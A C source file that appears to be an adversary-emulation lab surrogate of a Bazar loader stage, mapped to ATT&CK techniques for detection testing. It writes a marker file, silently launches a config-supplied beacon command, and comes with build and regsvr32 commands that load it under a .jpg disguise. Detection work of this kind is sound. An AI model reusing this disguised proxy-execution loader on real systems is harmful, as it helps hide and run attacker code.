/*
 * c0015_bootstrap_dll.c — benign Bazar-stage bootstrap surrogate [LAB-SURROGATE]
 *
 * Campaign mapping:
 *   - proxy execution of a DLL (Bazar loader chain analog)  -> T1218.010/T1218.011 role
 *   - writes execution marker (proof the export ran)         -> observable for E11
 *   - optionally launches the session-1 beacon (handoff S2->S3)
 *
 * NO HARDCODED LAB VALUES: every path/command is read from
 * %PUBLIC%\C0015\config.ini at runtime. If config is missing the
 * export returns immediately (control path, no side effects).
 *
 * Build (on Kali / any mingw host):
 *   x86_64-w64-mingw32-gcc -shared -o c0015-comparefor.jpg c0015_bootstrap_dll.c -lshlwapi
 * The output keeps the .jpg masquerade name (T1036); regsvr32 loads it via
 *   regsvr32.exe /s C:\Users\Public\C0015\c0015-comparefor.jpg
 */
#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string.h>

static void ini_get(const char *section, const char *key, char *out, size_t outsz)
{
    GetPrivateProfileStringA(section, key, "", out, (DWORD)outsz,
                             "C:\\Users\\Public\\C0015\\config.ini");
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved)
{
    (void)h; (void)reserved;
    return TRUE;
}

__declspec(dllexport) HRESULT LabEntry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;

    char marker_name[128] = {0};
    char beacon_cmd[512] = {0};
    ini_get("bootstrap", "marker_name", marker_name, sizeof(marker_name));
    ini_get("beacon", "beacon_cmd", beacon_cmd, sizeof(beacon_cmd));

    if (marker_name[0] == '\0') {
        return S_FALSE; /* control path: no config -> no side effects */
    }

    /* observable 1: execution marker (E11 FileCreate) */
    char marker_path[MAX_PATH];
    wsprintfA(marker_path, "C:\\Users\\Public\\C0015\\%s", marker_name);
    HANDLE f = CreateFileA(marker_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        const char *text = "c0015 lab benign dll executed\n";
        DWORD written = 0;
        WriteFile(f, text, (DWORD)strlen(text), &written, NULL);
        CloseHandle(f);
    }

    /* observable 2: handoff S2->S3 — launch the session-1 beacon (config-driven) */
    if (beacon_cmd[0] != '\0') {
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        char cmdline[600];
        wsprintfA(cmdline, "%s", beacon_cmd);
        if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                           NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
    return S_OK;
}

/* regsvr32 entrypoint: forwards to the same benign behavior */
__declspec(dllexport) HRESULT DllRegisterServer(void)
{
    return LabEntry(NULL, NULL, NULL, 0);
}
